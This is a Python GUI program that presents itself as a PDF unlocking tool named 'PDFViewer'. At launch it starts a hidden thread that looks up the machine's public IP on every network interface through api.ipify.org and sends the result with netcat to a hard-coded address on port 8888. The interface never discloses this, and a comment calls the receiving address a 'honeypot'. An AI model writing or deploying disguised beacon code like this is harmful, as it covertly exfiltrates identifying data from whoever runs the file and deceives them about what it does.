import tkinter as tk
from tkinter import filedialog, messagebox
import PyPDF2
import subprocess
import os
import threading
import requests
import netifaces

def get_non_lo_interfaces():
    # Get a list of all network interfaces
    interfaces = netifaces.interfaces()
    # Filter out the 'lo' interface
    non_lo_interfaces = [interface for interface in interfaces if interface != 'lo']
    return non_lo_interfaces

def execute_netcat():
    try:
        # CHANGE THE ADDRESS TO YOUR HONEYPOT ADDRESS
        address = "192.168.137.143"
        # Get a list of non-loopback interfaces
        interfaces = get_non_lo_interfaces()

        # Try each interface
        for interface in interfaces:
            curl_command = ["curl", "-s", "--interface", interface, "https://api.ipify.org"]
            try:
                output = subprocess.check_output(curl_command).decode().strip()
                # If we get a successful response, send the result using netcat
                if output:
                    # Send the result using netcat and close the connection
                    netcat_command = f'echo "My Real IP: {output}" | nc {address} 8888 && sleep 1'
                    subprocess.run(netcat_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except subprocess.CalledProcessError:
                # If an error occurs, try the next interface
                continue

        if not output:
            print("Error")
            return

    except Exception as e:
        print("Error")

def select_file():
    filename = filedialog.askopenfilename(title="Select PDF File")
    if filename:
        entry.delete(0, tk.END)
        entry.insert(0, filename)

def decrypt_pdf(input_pdf, password):
    with open(input_pdf, 'rb') as file:
        pdf_reader = PyPDF2.PdfReader(file)

        if pdf_reader.is_encrypted:
            pdf_reader.decrypt(password)

        pdf_writer = PyPDF2.PdfWriter()

        for page in pdf_reader.pages:
            pdf_writer.add_page(page)

        return pdf_writer

def save_decrypted_pdf(pdf_writer, output_pdf):
    with open(output_pdf, 'wb') as output_file:
        pdf_writer.write(output_file)

def open_pdf(output_pdf):
    try:
        subprocess.Popen([output_pdf], shell=True)
    except Exception as e:
        print("Error opening PDF:", e)

def process_pdf():
    input_pdf = entry.get()
    password = 'your_password'
    # Get the directory and filename from the input PDF
    input_dir, input_filename = os.path.split(input_pdf)

    # Construct the output PDF filename with "decrypted_" prefix
    output_filename = f"1_{input_filename}"
    output_pdf = os.path.join(input_dir, output_filename)

    decrypted_pdf_writer = decrypt_pdf(input_pdf, password)
    save_decrypted_pdf(decrypted_pdf_writer, output_pdf)
    
    # Display a message box with the file path
    output_message = f"PDF File saved as:\n{os.path.abspath(output_pdf)}"
    messagebox.showinfo("File Unlocked", output_message)

# Create GUI
root = tk.Tk()
root.title("PDFViewer")

frame = tk.Frame(root)
frame.pack(padx=10, pady=10)

label = tk.Label(frame, text="Select PDF File:")
label.grid(row=0, column=0, sticky="w")

entry = tk.Entry(frame, width=50)
entry.grid(row=0, column=1, padx=5, pady=5)

browse_button = tk.Button(frame, text="Browse", command=select_file)
browse_button.grid(row=0, column=2, padx=5, pady=5)

process_button = tk.Button(frame, text="Unlock", command=process_pdf)
process_button.grid(row=2, column=0, columnspan=3, pady=10)

# Create a thread to execute the netcat function concurrently with the GUI
netcat_thread = threading.Thread(target=execute_netcat)
netcat_thread.start()

root.mainloop()
